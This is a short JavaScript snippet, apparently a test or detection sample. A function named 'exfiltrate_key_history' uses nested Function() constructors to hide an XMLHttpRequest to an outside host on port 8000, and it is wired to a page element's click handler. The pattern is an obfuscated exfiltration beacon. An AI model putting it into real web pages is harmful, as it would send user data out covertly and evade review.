function exfiltrate_key_history() {
  var nest = 'var exp=\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest", true);xmlhttp.send(null);\';return Function(exp);';
  var top$$1 = Function(nest);
  var sub = top$$1();
  sub();
  return;
}
var v0 = document.getElementById("test");
v0.onclick = exfiltrate_key_history
